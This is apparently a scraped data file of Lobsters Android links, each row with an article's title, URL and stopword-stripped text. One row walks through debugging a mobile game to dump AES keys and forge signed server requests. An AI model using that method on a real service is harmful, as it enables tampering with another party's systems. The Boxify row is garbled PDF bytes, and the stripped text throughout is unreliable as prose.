operatoreitalia itoffertetelefonicheperte itservizipremium assistenzasim assistenzalineariattiva assistenzalinea itpromofferte exodus two exodus two elf utility command control com wsmylocalweather com attivaexodusesurv
112,Lobsters,android,Android,Self-Hosted Phone Location Logger,https://gkbrk.com/2019/03/phone-location-logger/,selfhosted phone location logger,phonetrack,using google play service android phone google receives keep track location history includes gps coordinate timestamps privacy implication revoked pretty much permission google play service disabled location history google setting would respect might creepy random company data would useful still want know location park stumbled upon randomly vacation year ago remember seeing location tracker browsing fdroid found various application picked one recently updated app nextcloud companion app support custom server since want heavy nextcloud install keep track location decided go custom server approach end decided easiest path make small cgi script python appends json encoded line text file accessible data format process file pretty much every programming language import whatever database want query whatever way see fit app went called phonetrack find apk source code link fdroid replaces parameter url logging every parameter look like http examplecomcgibinlocationrecorderpy acc acc alt alt batt batt dir dir lat lat lon lon sat sat spd spd timestamp timestamp script glory import cgi import json path homedatabaseslocationtxt print contenttype textplainn form cgifieldstorage check authentication token formgetvalue token secretvalue raise exception nope obj accuracy formgetvalue acc altitude formgetvalue alt battery formgetvalue batt bearing formgetvalue dir latitude formgetvalue lat longitude formgetvalue lon satellite formgetvalue sat speed formgetvalue spd timestamp formgetvalue timestamp open path log line jsondumps obj logwrite f line n
113,Lobsters,android,Android,Do Not Disturb: Tackling Smartphone Addiction,https://chargen.one/steve/do-not-disturb-how-i-tackled-my-own-smartphone-addiction,disturb tackling smartphone addiction,ruining life hijack thing got control angelheaded hipster flashpoint stage disturb stage notification stage reduce interaction stage trimming apps violating privacy cambridge analytica scandal better ublock origin stage seasonal cleaning great option fediverse mastodon pixelfed final thought,smartphones social medium ruining life say press smartphones social medium biologically unprepared deal smartphones social medium designed hijack attention reward centre brain well nt notice brain altered post write changed smartphone use helped reclaim time attention span ability present moment something lost regained wo nt talk everything instead focus thing talk compiling firmware mainlining fdroid microg time instead post without changing phone never felt connected friend phone absent presence thing got control year ago iphone digital tool used anything else could think pointless app notification came hear noise screen would light pavlovian style would neuron phone went bed woke went work started find getting le happy felt le able concentrate never felt connected friend phone absent presence attention span shrivelled could nt watch whole film reading book impossible pocket free time check facebook twitter instagram email ad nauseum missed bus train absorbed something nt even remember reading forgotten boredom time mind wander became angelheaded hipster burning ancient heavenly connection starry dynamo machinery night lost buzz loweffort connection gained ability connect purpose flashpoint apple pulled plug headphone jack realised time apple product nt want jump apple walled garden google instead tried degoogle life definitely another post process found way make phone work rather found whole new world ethical social medium far gained happiness time space lost buzz loweffort connection gained ability connect purpose wanted sustainable phone experience nt minimalist experience nt phone pared back basic phone experience work everyone sustainable phone experience different journey goal journey encourage reader travel stage disturb first thing reduce volume timing notification receive one best feature android io disturb nt enough alone combined sane rule make break phone since early day blackberry people chained notification notification many problem worst impact sleep disturb help take back sleep also let take back time use disturb setting call message notification notification tusky signal qksms call saturday sunday daytime exception specific contact group specific service using contact group manage exception let family friend reach time call also come someone call time minute work io android stage notification also restrict notification restrict apps send notification restrict apps send notification iphone used ihg app book hotel app used notification update booking also advertised many apps use notification advert nt happen current phone apps trigger notification phone tusky mastodon notification mail notification calendar notification signal messenger message app update notification fdroid yalp everything else check app feel like imagine caring people barely know amazing person world lie next stage reduce interaction try get social medium notify email increase amount step needed respond use dedicated mail account lowvalue mail notification signups respond notification time light pop email notification app still show unread visit set aside time use social network try use purpose instead passively scrolling every minute marizel noticed used phone woke used bed sleeping imagine caring people barely know amazing person world lie next phone stay outside bedroom fact use technology bedroom beyond light radiator room used thing none need complex technology stage trimming apps wan na see home screen deleted facebook light continuous commitment violating privacy cambridge analytica scandal last straw understand many people option example still heavy twitter user often make sad keep home screen reducing amount apps helped lot time nt need app started removing apps nt used month removed apps functioning mobile site bookmarked home screen switched lighter nonofficial social medium client nt bug track alternative help get time back ca nt delete facebook remove app phone much replace dedicated browser app used facebook set facebook mobile site home page browser bonus point dedicated browser app support adblocking find social medium make angry upset consider consider using laptop laptop tend stay online unlike phone tablet using laptop requires conscious decision engage instead passive default still catch friend family facebook need make little effort friction best tool control social medium control use setting adblockers laptop often easier phone said great apps like better worth looking android firefox support addons mobile ublock origin stage seasonal cleaning keep thing light created month folder home screen every month go installed apps nt used app month go month folder mean app home screen taking space use come drawer home screen nt use app month uninstall keep phone light quick clean pretty brutal home screen wallpaper black use dark mode keep screen brightness low icon home screen along two folder month folder discussed earlier folder named nt nt folder hold apps want use le nt nt mean nt use mean nt make default action nt folder currently following apps red reader simplywallst tusky feel relationship app back track take nt decide put next nt improve consider removing nt remove make active decision app future mentioned wallpaper black found great option lockscreens might wondered tusky mastodon well used use facebook twitter instagram find apps would encourage vomit thought argue people share thing upset decided find alternative glad use mastodon much happier alternative twitter mastodon bit like friendlier happier twitter good thing instead instagram use pixelfed still new waiting android app writing use writefreely using read application part something called fediverse noncommercial open way sharing nobody incentivised get like share likewise nobody incentivised like share stuff space tend smaller sometimes le active way healthier ethical social medium le invasive avoids dopaminefeedback loop get commercial network people still contact via social network mastodon pixelfed course plenty option email got rid evil social medium around reclaim life well start setting particular time use social medium check social medium phone mostly start day hour bed rest time need conscious decision use laptop take time reclaim attention span found kindles amazing device wish could find open alternative wanted also found little thing reclaim attention span instead using phone get try make sure marizel first thing see first spend minute watching sleep sometimes think random thing time watch find help focus important usually make u coffee first thing morning look kitchen window kettle boil amazing view phone stay living room give time every day mind wander minute wake make real difference perspective final thought biggest thing accept work progress sometimes going fail going get argument twitter going spend much time app good reason time physically people mentally absent ok important recognise try stop happening next time life surrounded bell flashing light find time present care worth like share world
114,Lobsters,android,Android,Boxify: Full-fledged App Sandboxing for Stock Android (2015),https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-backes.pdf,boxify fullfledged app sandboxing stock android,,obj endobj obj filterflatedecodeid index info rlength rsize stream b endstream endobj startxref eof obj stream e n ܔ endstream endobj obj metadata rpages rstructtreeroot rtypecatalog endobj obj font procset pdftext property rotate typepage endobj obj stream w ə q q ŵ l x wk p endstream endobj obj stream ft q qt p c z jmp uk ak g b w ydx f f u r stream w ej l ck j kp f b ア qh w q k ӯ hx c lmodz w w эm u q c z endstream endobj obj stream endstream endobj obj stream u r endstream endobj obj stream u j ev xm k uu bլ fz endstream endobj obj stream dƃ b f w l x endstream endobj obj stream pzݖ l vt
115,Lobsters,android,Android,A Google-free Android setup,https://niftylettuce.com/posts/google-free-android-setup/,googlefree android setup,googlefree android setup table content disclaimer email backup device android file transfer install requirement install requirement http wikilineageosorgadbfastbootguidehtml specific device http twrpmedevices specific device http downloadlineageosorg http wikilineageosorgdevices specific device http wikilineageosorgdevicesbullheadinstall duckduckgo http http downloadlineageosorgextras fdroid recommended application recommended application email navigation osmand satstat email mail forwardemail security password management freeotp snoopsnitch flowcrypt openkeychain skimmer scanner yet adaway install requirement password store pas passimport afwall install requirement pilfershush jammer anysoftkeyboard qksms firefox klar transistor http wwwradiobrowserinfogui topvote sharing link computer phone etar vinyl music player lawnchair open camera secscanqr newpipe easer termux night screen yalp store download apps like slack using slide omni note goodweather forecastie pedometer networking openvpn protips set custom network time protocol ntp server cloudflare android http developerscloudflarecomtimeservicesntpusage gist get stuck search xda http backup sm message want go googlefree mac email sharing link computer phone http duckduckgocom optout google location service network router http hlen adjust captive portal detection captive portal detection unless highly technical understand implication disabling captive portal likely disable device working airport coffee shop public wifi hotspot http wwwdigitaltrendscommobilehowtogetdeveloperoptionsonandroid additional reading niftylettuce gmailcom github twitter update rssxml feed,googlefree android setup october table content disclaimer way responsible damage phone problem caused result article modifying phone risk please careful run issue feel free email try help please note limited time may able respond backup device unless fresh device highly recommend backing photo picture message video contact item may already backup somewhere two way strongly recommend manually usb cable using android file transfer using tool called twrp instruction included full system backup install requirement additionally recommend write list favorite apps installed notepad somewhere install requirement currently recommend using lineageos alternative stock android operating system lineageos free opensource operating system smartphones tablet computer based android mobile platform order install operating system please follow step install adb fastboot following instruction http wikilineageosorgadbfastbootguidehtml download latest version twrp recovery specific device http twrpmedevices sometimes may need actually use older version eg unable boot recovery mode first try latest possible download latest version lineageos specific device http downloadlineageosorg go http wikilineageosorgdevices click specific device proceed unlock phone bootloader clicking installation instruction shown following instruction unlocking bootloader example google nexus following instruction http wikilineageosorgdevicesbullheadinstall device respective installation guide step unlocking bootloader may need search xda developer forum note device bootloaders unlocked eg samsung galaxy supported boot bootloader adb run command terminal command prompt adb reboot bootloader install twrp recovery management software fastboot sure replace pathtotwrpbaconimg script path file downloaded step run command terminal command prompt fastboot flash recovery pathtotwrpbaconimg still fastboot menu use volume key select recovery mode hit power button select otherwise need boot recovery mode pressing holding volume power button second may vary depending device search duckduckgo device shortcut necessary make backup twrp http pull recovery backup zip phone using adb sure replace sdcardpathtobackupzip path backup phone mybackupzip path like store file locally computer run command terminal command prompt adb pull sdcardpathtobackupzip mybackupzip repeat step recovery mode menu navigate wipe run factory reset recovery mode push lineageos rom phone sure replace pathtolineagezip script path file downloaded step run command terminal command prompt adb push pathtolineagezip sdcard recovery mode menu navigate install select file pushed inside sdcard folder optional root device installing arm su addon http downloadlineageosorgextras make sure reboot device running step test everything first push sdcard install similarly lineageos step reboot device recovery mode go reboot tap system install fdroid install preferred application recommended application recommended application application listed googlefree alternative andor useful application highly recommend looking googlefree alternative favorite app please email glad help navigation osmand navigation direction using openstreetmap data alternative google map satstat viewing satellite gps sensor data email mail receiving email multiple account support openpgp encryption alternative gmail forwardemail private encrypted free email forwarding made alternative google business security password management freeotp twofactor authentication token management alternative google authenticator snoopsnitch checking mobile network security flowcrypt pgp encryption fdroid openkeychain encrypting file communication openpgp compliant pair well mail skimmer scanner yet fdroid download apk using yalp store see adaway blocking ad us host file requires root see step install requirement password store simple password management built top pas may also want use passimport alternative google sync afwall rootbased iptables firewall management requires root see step install requirement pilfershush jammer blocking unwanted use onboard microphone using passive mode recommended pause telephony interrupt eg make call anysoftkeyboard onscreen keyboard alternative google keyboard android stock keyboard qksms sm messaging alternative android stock messenger google hangout firefox klar private browsing adblocking webtracking blocking support alternative google chrome android stock browser transistor listening radio stream internet use http wwwradiobrowserinfogui topvote copyingadding link transistor app see link sharing link computer phone etar calendar management alternative google calendar vinyl music player listening music alternative android stock music player google music lawnchair better launcher customizability alternative android stock launcher open camera taking picture video alternative android camera google camera secscanqr qr code scanning generation secure private alternative newpipe viewing youtube video alternative youtube easer eventdriven android automation termux terminal emulator ssh support night screen adjusting brightness screen color prevent eyestrain yalp store downloading apps directly google play store apk file alternative google play store download apps like slack using slide browsing reddit omni note taking note alternative google keep goodweather weather make sure add widget home screen alternative google weather forecastie weather make sure add widget home screen alternative google weather pedometer pedometer alternative google fit networking openvpn virtual private network vpn protips set custom network time protocol ntp server cloudflare android cloudflare offer time service http developerscloudflarecomtimeservicesntpusage adb shell setting put global ntpserver timecloudflarecom thanks gist command get stuck search xda search duckduckgo xda lineageos devicename yourproblem generally find solution example might need completely reflash firmware radio bootloader depending device nexus followed thread issue http found thread searching nexus lineageos xda backup sm message simply install qksms see link app first sync native message go backup restore click backup adb pull sdcardqksms somelocalpath replace somelocalpath want save backup locally later done step adb push somelocalpath sdcardqksms reopen qksms app installing restore backup make sure json file sdcardqksmsbackups folder otherwise work want go googlefree mac send email ping back article sharing link computer phone computer simply copy link clipboard go http duckduckgocom search qr insert link duckduckgo automatically generate qr code scan phone using secscanqr qr code app listed optout google location service network router see http hlen need affix router ssid name nomap adjust captive portal detection may also wish disable captive portal detection change default google server unless highly technical understand implication disabling captive portal likely disable device working airport coffee shop public wifi hotspot assumes android debugging mode turned developer mode enabled http wwwdigitaltrendscommobilehowtogetdeveloperoptionsonandroid note need reboot device running command disable adb shell setting put global captiveportalmode setting delete global captiveportalmode reenable adb shell setting put global captiveportalmode additional reading niftylettuce gmailcom github twitter update rssxml feed
116,Lobsters,android,Android,Hello LineageOS 16.0,https://lineageos.org/Changelog-22/,hello lineageos,hello lineageos style api summer survey result trust upgrading lineageos download portal gapps su installation page lineageos changelog style api goodbye lineageos infrastructure previous blog post gitlab issue wiki crowdin device change previous version devicesupport charter initial device shamu shark berkeley charlotte nash payton griffin bacon cheeseburger dumpling klte klteactivexx kltechn kltechnduo klteduos kltedv kltekdi kltekor pioneer discovery polaris jason beryllium ham added device kiwi huashan hayabusa mint tsubasa odin pollux polluxwindy yuga,hello lineageos working hard since august port unique feature new version android thanks major cleanup refactoring done previous version able focus feature reliability time particular privacy guard su addon received sizeable amount improvement minor change made style api compatible eventually become default implementation dark mode android future third party apps follow system style meaning style api allow coherent experience across apps announced summer survey result posted introducing new feature trust beginning ability block new usb device connection device locked please note feature enabled perdevice basis due layer implemented trebuchet also able hide apps require authentication opening please note restriction limited trebuchet systemwide feel branch reached feature parity ready initial release recent activelydeveloped branch march begin receiving build nightly moved weekly build lineageos launching small selection device additional device begin receiving build ready make minor change build script better handle unique feature resulting complication modern device upgrading lineageos optional make backup important data download build either download portal built updater app export downloaded package updater app sdcard longpressing selecting popup menu download proper addons package gapps android o make sure recovery firmware date format system partition follow lineageos section installation page please note currently official build need wipe device installing unofficial build must wipe data recovery installing lineageos changelog possible set custom automatic update check interval updater never day week month calculator support dark mode style api added action message notification exchange support december january february security patch merged webview updated chromium goodbye lineageos nougatbased release discontinued last build published february branch locked still open contribution security patch branch getting security patch backported community lineageos remain active development expect new feature come since majority developer jumped pie branch also important note though moment device jumping directly device future need wipe data follow instruction wiki page officially support migrating data variety reason infrastructure announced previous blog post moved away jira favor gitlab issue bug reporting wiki received visual update match main website lineageos translation available crowdin like contribute translating lineageos native language device change previous version supported device must meet requirement stated devicesupport charter additionally certain device built supported version order allow build newer branch user would like newer version retaining support older version certain critical devicespecific feature lost incompatibility newer branch initial device device name wiki maintainer moved google nexus shamu elektroschmock npjohnson â google pixel ultra prototype shark rastley â huawei honor view berkeley â huawei pro charlotte â leeco le elite codeworkx leeco le themard tortel motorola moto force nash erfanoabdi npjohnson motorola moto payton erfanoabdi motorola moto z griffin erfanoabdi stargo vache oneplus one bacon npjohnson oneplus aviraxp ozzyscmacc oneplus dianlujitao oneplus cheeseburger amartinz codeworkx jrizzoli jumoog xingrz oneplus dumpling amartinz codeworkx oppo find mikeioannina samsung galaxy lte klte haggertk samsung galaxy active klteactivexx javelinanddart samsung galaxy lte kltechn haggertk samsung galaxy lte duo kltechnduo haggertk samsung galaxy lte duo klteduos haggertk samsung galaxy lte kltedv haggertk samsung galaxy lte kltekdi haggertk samsung galaxy lte kltekor haggertk samsung galaxy tab wifi mccreary samsung galaxy tab wifi mccreary sony xperia pioneer cdesai stricted sony xperia ultra discovery chenji xiaomi mi mix polaris bgcngm â xiaomi mi note jason dianlujitao xiaomi poco beryllium bgcngm warabhishek â zuk ham added device device name wiki maintainer moved huawei honor kiwi baddaemon dobo lg lg canada lg international lg korea lg sprint lg tmobile lg verizon sony xperia sp huashan adriandc sony xperia tx hayabusa adriandc sony xperia mint adriandc sony xperia v tsubasa adriandc sony xperia zl odin adriandc chippaa cyberwalkman daedroza sony xperia tablet z lte pollux adriandc chippaa cahbkaup cyberwalkman daedroza sony xperia tablet z wifi polluxwindy adriandc chippaa cahbkaup cyberwalkman daedroza sony xperia z yuga adriandc chippaa cyberwalkman daedroza mardonhh
117,Lobsters,android,Android,Google wants you to know Android's as hard to hack as Apple's iOS,https://www.cnet.com/news/google-android-is-just-as-secure-as-ios-iphone-david-kleidermacher/,google want know android hard hack apple io,vulnerable stagefright bug infected malicious software called hummingbad cia developed malicious software android phone google released thursday problem used leave user exposed android safeguard better apple io security update half android device received security update keeping bad apps security blockchain decoded,year struggling keep user safe google say android safe competition smith collectiongadogetty image list big security flaw could let hacker compromise phone one name come lot android learned google operating system phone vulnerable stagefright bug hacker could exploit sending text message security researcher revealed million android phone infected malicious software called hummingbad hacker used generate bogus ad revenue document revealed wikileaks showed cia developed malicious software android phone according david kleidermacher google head security android google play chrome operating system since may android team hard work make worry surrounding bug thing past fact kleidermacher said without naming name android safe competition big claim considering android main competitor apple iphone bold idea permeates annual android security report google released thursday android security made significant leap forward many protection lead industry report say page one echoing report kleidermacher told cnet android flaw become harder researcher find software protects user malicious software well problem used leave user exposed bad actor nt big problem anymore android safeguard year google fought impression android phone hard protect hacker android flaw hard fix bad software easy download onto android phone someone find major android flaw company send updated software company sell android phone company deliver update take really long time happen top android user easily selfown download malicious software without meaning nt restricted choosing apps google play store apple nt either issue deliver security update directly iphones prevents user getting apps outside app store android nt moving toward apple model instead kleidermacher said possible address issue retrofitting security android phone word even android nt originally designed security top priority built better google know android getting safer follow money company say paying freelance bug hunter money per flaw mean harder find flaw begin android security matured become difficult expensive attacker find high severity exploit report say word lowhanging fruit gone reflected result major annual phone hacking event mobile goodguy hacker nt win reward core android flaw kleidermacher chalk power opensource code thought echoed report global opensource project android community defender collaboratively locating deeper vulnerability developing mitigation report say community may order magnitude larger effective closedsource project similar scale apple io closedsource project security update address difficulty patching major bug like stagefright kleidermacher said android power requiring phone maker agree regular update schedule google already come long way getting phone maker provide regular update said going keep improving report nt provide exact number many android device getting regular security update give idea majority deployed device different android model device manufacturer running security update last day report say android security report google said half android device received security update end year get better kleidermacher said think going see quite large increase overall percentage device getting regular security update google play protect scan potentially harmful apps might spamming ad generating bogus ad revenue worse google keeping bad apps google also pushing get malicious apps android phone taking away right download apps outside google play store instead building tool identify turn bad apps google play protect service android scan device apps know bad warn user risk android stepped billion time stopped user downloading potentially harmful apps google call also removed nearly million bad apps user phone include apps mirror way hummingbad worked generating click advertiser without user even knowing also include hostile downloaders seem like innocuous apps start downloading apps behave badly protecting user harmful apps important thing google secure android kleidermacher said bad apps directly harmful user bug like stagefright said never used attack large number android user good news google ca nt protect every user stagefright use google play protect save bad apps even nt get security update android phone security stay uptodate latest breach hack fix cybersecurity issue keep night blockchain decoded cnet look tech powering bitcoin soon myriad service change life
118,Lobsters,android,Android,My phone serves me 400+ ads and trackers per hour,https://raymii.org/s/blog/My_phone_serves_me_400_ads_per_hour_blokada_blocks_beats_them_all.html,phone serf ad tracker per hour,antivirus security software vendor avg say google wellbeing blokadaorg ublock origin like article consider sponsoring trying digital ocean vps link get credit day referral link adblock android blog blokada security ublockorigin,recently switched new phone year old phone stopped receiving call making time new one new phone android allowed install system wide adblocker blokada need adblocker besides seeing advertisement trackedspied every move improves battery life make device secure malicious advertisement make page apps load faster make data plan last longer page cleaner view read telling big antivirus security software vendor avg say blokada work posing local vpn filtering advertisement tracker kind nasty thing spy bring malware require root access android open source best work well big surprise three day using phone everything set transferred blokada blocked almost fivethousand advertisement tracking request request hour ad every minute would use device hour period according google wellbeing statistic three day used phone actively hour mean phone served ad tracker per active hour adstrackers served phone use went bed reset counter woke blocked request already mean even sleeping using phone used spy tracking serve advertisement blokada free open source software found blokadaorg recommend install default adblock list energized blu plus tracker list found site application work user experience would without blokada battery life still maybe even bit better desktop browser recommend ublock origin like article consider sponsoring trying digital ocean vps link get credit day referral link tag adblock android blog blokada security ublockorigin
119,Lobsters,android,Android,Fixing an airline app bug for fun and profit,https://pmatias.me/2019-02/fixing-airline-app-fun-profit/,fixing airline app bug fun profit,problem statement debugging issue bytecode viewer nobreak space quick dirty fix result discussion root cause pure java locale data wrapper locale data since bug started manifest locale data change insert nobreak space new formatter adding spacing unit test come app developer notice several month uncaught exception handler conclusion,azul linhas aéreas brazilian airline offer cheaper ticket customer buying mobile app ticket bought website extra convenience fee charged unfortunately mobile app bug several month cause close user fill payment method article patch app bytecode fix bug problem statement booking flight using website azul charge convenience fee brl per passenger funny convenience fee often expensive embarkation fee charged airport luckily enough flight booked using mobile app exempt convenience fee however conclude booking since app crash select payment method debugging issue since app suddenly closed first hypothesis come mind uncaught exception fired app crash reporting mechanism silent one order test hypothesis launch adb logcat try book flight app crash get following stack trace javalangnumberformatexception input string javalanglongparselong javalanglongvalueof brcomvoeazulcontrollercomprapassagemcomprapassagemcontrollerremoverseparadoresdevalor brcomvoeazulcontrollercomprapassagemcomprapassagemcontrolleractiongetpaymentinstallmentinfo brcomvoeazulcontrollercomprapassagemcomprapassagemcontrolleractionapplypromotioncode brcomvoeazulfragmentcomprapassagemcomprapassagempagamentofragment androidwidgetadapterviewfireonselected androidwidgetadapterviewdispatchonitemselected androidwidgetadapterviewaccess androidwidgetadapterview selectionnotifierrun androidoshandlerhandlecallback androidoshandlerdispatchmessage androidoslooperloop androidappactivitythreadmain javalangreflectmethodinvoke native method comandroidinternalosruntimeinit methodandargscallerrun comandroidinternaloszygoteinitmain nice seems like app trying convert amount due cent long however leading space string causing conversion fail forget trim string retrieve apk device try open using bytecode viewer luck give could decode resource resourcesarsc however problem since intend understand modify bytecode thus extract classesdex open let decompile culprit method mentioned stack trace public long removerseparadoresdevalor final bigdecimal bigdecimal final decimalformat decimalformat decimalformat numberformatgetcurrencyinstance new locale pt br decimalformatsetmaximumfractiondigits final decimalformatsymbols decimalformatsymbols decimalformatgetdecimalformatsymbols decimalformatsymbolssetcurrencysymbol decimalformatsetdecimalformatsymbols decimalformatsymbols return longvalueof decimalformatformat bigdecimal replace replace trim amusing trim string leading whitespace opening logcat output hex editor realize whitespace char composed byte correspond unicode code point nobreak space trim method seem strip quick dirty fix decompiler rarely able generate wellformed enough java recompiled class therefore easier work directly bytecode changing bytecode viewer pane mode editable smalidex look removerseparadoresdevalor method insert following instruction last call replace moveresultobject conststring conststring invokevirtual ljavalangstring replace ljavalangcharsequence ljavalangcharsequence ljavalangstring cause replace called trim bytecode viewer able save modified code back classesdex file calling smali hood however need zip back inside apk manually since able open apk directly bytecode viewer sign apk debug key jarsigner verbose sigalg digestalg keystore homeandroiddebugkeystore azulapk androiddebugkey password android finally need uninstall original app install modified apk result able book flight wife paid brl embarkation fee two passenger whereas booked website would need pay brl discussion far good fixed bug saved money scientist might asking question root cause first interesting fact issue happen removerseparadoresdevalor run openjdk turn openjdk pure java implementation decimalformat looking locale data us see insert ordinary space currency symbol hand android implementation decimalformat wrapper looking locale data us see insert nobreak space currency symbol since bug started manifest locale data responsible currency format changed last time sep change whitespace currency symbol numeric value however interesting fact current code automatically insert nobreak space currency symbol numeric value even present pattern specified locale data since happen new formatter responsible adding spacing first commited sep unit test fixed apr came change locale data since android ship locale data android since first release android even recent release come app developer notice several month obviously test app android way could get know bug collect crash report funny uncaught exception handler app installs related app rating yes serf purpose avoiding ask user rate app app crashed least course user would give many star conclusion perhaps easier launch android emulator book flight could know strongly recommend azul linhas aéreas reimplement removerseparadoresdevalor method adopting reliable implementation quick dirty fix example avoiding dependence locale data work correctly start collecting crash report deal accordingly
120,Lobsters,android,Android,"Reverse engineering of a mobile game, part 2: they updated, we dumped memory",https://medium.com/@xplodwild/reverse-engineering-of-a-mobile-game-part-2-they-updated-we-dumped-memory-27046efdfb85,reverse engineering mobile game part updated dumped memory,state thing digging code debugging live process device,state thingsfirst thing first fired mitmproxy checked api call changed update endpoint data look encrypted request response used pure json unreadable byteshowever notice done anything packet replay performing action game produce another tournament query led post body hash generatednext previously need dump new globalmetadatadat file run tool load ida since already know hash loaded crypto class constructor packet built httpclient kickstart bit partsdigging codeafter giving ida time load thousand function let look new updated httppost method since started clean disassembly project relabeled field based dll assembly output reversed net reflector get cleaner pseudocode find friendly cryptocomputehash computes hash value based unencrypted byte byte fed cryptoencrypt method indeed encrypting body sending inspecting method reveals rijndaelbased aes encryption cool thing using standard net crypto method mean field description detail directly net framework documentation well example code replicate encryption decryption process right msdnfinally key salt moved crypto class separate cryptoconstants class change much work lovely game developer even helped u size c field know offset computed key iv stored need manually calculate also spoiler manage calculate properly base salt password reason directly using key iv good enoughso need hack new game revision aes key new salt able encrypt decrypt message forge server could previous articlein previous article stuck retrieving secret byte app code directly made bruteforce originally mentioned alternative method debugging device time choice access byte array directly static code least know best way dump device emulator memory game running get byte live let itdebugging live process deviceour goal dump memory game example time hashing server message dump hashsalt byte aes iv keyto install ida debugging server device run use adb forward port host machine usb done attach ida debugger process device attach process devicebut actually attaching process need set breakpoints pseudocode make process pause ida show corresponding pseudocode line executed phone cpufirst want dump byte appended json body need set breakpoint final salt array appended let break immediately salt byte loaded computehashthen want break encryption key used dump aes key iv memory block note want break portion code executed early need attach debugger line executed found trick make ida run app scratch debugger immediately attached luckily unity assembly take time load tap app icon immediately press home pause game execution giving u time attach ida debugger resume game breaking call decrypt method attaching afterwards finea quick note dalvik ida debugger catch signal sent dalvik vm caused gc signal sigpwr sigxcpu expected need set ignore pas application debugger setup otherwise ida break execution every timethen attaching running game process press button need decrypt calculatehash button performs something online like tournament button debugger pause breakpoints set earlier doubleclick value tagged vsalt reveal memory value skip first byte mono header metadata byte array see salt value eye however aes iv key put raw memory address ida wrap variable need manual brain math pseudocode dword dwcryptoclass dword dword dwcryptoclass know previous article dwcryptoclass value pointer value first field class since start offset second field iv next pointer value pointed dwcryptoclass get actual value two field first need take dwcryptoclass pointer case add give u first pointer address pointer byte since library memory addressing arm instruction set also littleendian address read bottom top jump get actual pointer field byte array two pointer next get operator priority right code extract answer hidden behind two address first field cryptoaeskey second field cryptoivkey address add get actual array byte pointer start data start byte later know iv byte long key byte long fairly standard also noted net documentation since noted pseudocode used class dump enough byte two memory address also infer pseudocodefrom could write small encryptiondecryption using glorious golang sake waste time fiddling algorithm setting let reuse c decrypt message dumped earlier mitmproxy work left encrypted query right decrypted json behind small c decryption program runningwe use methodology dump computehash key since direct vsaltbytes variable able map ida doubleclicking reveals value updating previous hashcalculation feeding decrypted query lead u hash mitm request
121,Lobsters,android,Android,F-Droid for advanced users and developers,https://android.izzysoft.de/articles/named/fdroid-intro-2?lang=en,fdroid advanced user developer,advanced user fdroid privilegedextension fdroid privilegedextension lineageos microg twrp fdroid privilegedota advanced user developer company organisation others party repository guardian project izzyondroid repo could fdroid forum fdroid wiki izzyondroid developer process integrating app fdroid inclusion criterion request packaging meaningful fdroiddata reproducible build blog core fdroid gitlab repository used rfp fdroiddata fdroidclient privilegedextension fdroidserver repomaker fdroidwebsite developer acceptance criterion apps meet certain criterion developer description screenshots hand document pro con fdroiddata pro con pro con make life easier fdroid team possibly speed publication new app,fdroid package izzy previous article introduced fdroid privacyfriendly app store providing privacy friendly apps article address advanced user want get fdroid well developer wish provide apps via fdroid series fdroid article izzyondroid advanced user fdroid privilegedextension previous article showed fdroid app didnt come preinstalled install update security reason system apps also user manually trigger install android package manager intervenes asks user confirmation happen use google play store app system app want grant fdroid privilege using fdroid privilegedextension device shipped fdroid preinstalled course already integrated custom rom shipping fdroid integrated like lineageos microg also come manually install missing device need meet requirement bootloader need unlocked custom recovery like twrp either need installed device least temporarily loaded via fastboot boot given installation especially hard download zip fdroid privilegedota installer copy device flash via custom recovery menu install zip installation completed restart device reboot system immediately profit advantage completely systemintegrated fdroid app offer installation new apps happens immediately without package manager asking another confirmation automated update possible set related option accordingly new version apps installed fdroid installed automatically soon available without needing press another key advanced user developer company organisation others party repository repository verwalten previous article already addressed talking option repository package source default official main repo fdroid enabled three repository preconfigured fdroid archive older app version guardian repo guardian project guardian archive older app version guardian project preconfigured source solely provide apps conforming strong criterion fdroid project see nevertheless menu let include repository eg provided developer tester fdroid user provide apps acceptable official repo comply required criterion like izzyondroid repo see screenshot source deliberately excluded want use thirdparty repository must aware risk involved criterion app must meet included usually much le strict necessarily mean apps repos risky theoretically could list available thirdparty repository eg found fdroid forum comment discussion article edited member forum fdroid wiki list curated fdroid team izzyondroid list curated author article none list claim completeness everybody little sister run fdroid repository without need register somewhere fact discussed later article developer process integrating app fdroid created app want listed fdroid great app meet inclusion criterion also see nothing standing way first step creating request packaging checked already done someone else app even already listed process need fill form detail needed get app listed mean simply remove template fill something informal would make impossible process next filling much field possible care provide meaningful description one enabling user understand app app must install description screenshots also maintained app repository additionally donation link liberapay bitcoin etc must verifiable eg also mentioned app repository website protect abuse otherwise anybody could add hisher bitcoin address request saved within fdroid bot show check provided source repo result check post another comment request ideally green ie issue found often find small thing flew radar level piece meeting inclusion criterion binary library security issue setup like insecure gradlews using http url instead http mean make adjustment fixing indicated issue something unclear andor need help call another comment request fdroid team help step successfully taken fdroid team member create metadata file specification made try build app succeeds metadata file committed fdroiddata repository app finally build becomes visible fdroid user need signed security reason another manual step performed offline avoid risk signing key escape wild every developer agree would quite fatal developer also make use reproducible build requires additional effort come advantage making cross update possible successfully reproduced fdroid sign apk use one signed developer mean signature mismatch app originally installed via google play store updated fdroid vice versa long take opening rfp app finally available fdroid hard say everything go right straight might day could well several month problem arise plus fdroid team permanently understaffed might even take little someone pick blog david boddy describes process go easier sound performed several step usually done fdroid team member might contributed welcome use example core fdroid gitlab repository used repo verwendung rfp request packaging ask integrate new app fdroid catalog fdroiddata maintain metadata apps fdroidclient development troubleshooting fdroid android client privilegedextension development troubleshooting privilegedextension fdroidserver development troubleshooting fdroid server applikation repomaker development troubleshooting repomaker application fdroidwebsite thing affecting fdroid website developer acceptance criterion apps app accepted official fdroid catalogue need meet certain criterion sufficient simply provide apk file google play store aptoide fdroid accepts open source apps ie part app must available source code public repository everyone investigate especially mean proprietary component crashlytics firebase etc absolute showstopper either must removed entirely need provide separate build flavor excluding blob standing binary large object though little size eg jar accepted open source eg include source app repo git submodules fdroid compile source building app maven repository selection trustable repository supported fdroid nonfree build tool toolchains sdks must needed compile app app must use unique android package id thats also valid fork id must differ original brand must violated related law adhere also true use medium picture icon font sound app source tree fdroid subscribe api key service mean must required crreate app required later point app used might lead antifeature developer description screenshots hand app mit beschreibung und screenshot description graphic screenshots title document provided fdroid fundus documentation describes different approach integration metadata default description part app metadata file screenshots picture app pro easy set con change description requires issuemergerequest fdroiddata without screenshots potential user get limited idea app description multiple language screenshots well featuregraphic maintained fdroiddata pro screenshots help user better understand app description con change text image requires opening issuemergerequest fdroiddata see previous bulletpoint developer maintain data source repository app app made available google play store already devloper likely know corresponding tool fastlane triplet detail found linked document pro previous 